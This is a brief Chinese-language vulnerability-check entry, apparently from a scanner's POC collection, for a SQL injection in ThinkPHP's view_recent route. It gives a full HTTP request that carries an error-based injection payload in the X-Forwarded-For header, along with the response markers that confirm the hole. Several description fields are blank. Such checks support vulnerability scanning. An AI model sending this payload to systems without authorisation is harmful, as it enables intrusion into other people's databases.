﻿# thinkphp_view_recent_xff_sqli

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php?s=/home/article/view_recent/name/1 HTTP/1.1
X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
```

> 响应代码特征：-1

> 响应内容特征：56540676a129760a

> 上传文件定位：

> 验证文件来源：thinkphp_view_recent_xff_sqli.poc
